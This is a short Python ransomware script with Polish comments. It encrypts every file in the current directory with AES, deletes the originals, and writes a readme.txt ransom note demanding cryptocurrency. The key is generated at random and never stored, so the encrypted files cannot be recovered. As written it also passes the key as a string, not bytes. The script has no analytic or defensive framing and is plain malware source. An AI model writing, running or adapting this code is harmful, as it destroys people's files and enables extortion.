from Crypto.Cipher import AES
import os
import random
import string

def generate_aes_key():
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))  # Klucz AES o długości 32 bajtów

def encrypt_file(filename, key):
    cipher = AES.new(key, AES.MODE_EAX)
    with open(filename, 'rb') as file:
        plaintext = file.read()
        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    with open(filename + '.encrypted', 'wb') as encrypted_file:
        encrypted_file.write(cipher.nonce + tag + ciphertext)

def ransom_note():
    return "Twoje pliki zostały zaszyfrowane. Wymagamy okupu w kryptowalucie do momentu odszyfrowania."

def main():
    key = generate_aes_key()
    files_to_encrypt = [filename for filename in os.listdir() if os.path.isfile(filename)]
    
    for filename in files_to_encrypt:
        encrypt_file(filename, key)
        os.remove(filename)  # Usuń oryginalny plik

    with open('readme.txt', 'w') as ransom_note_file:
        ransom_note_file.write(ransom_note())

if __name__ == "__main__":
    main()
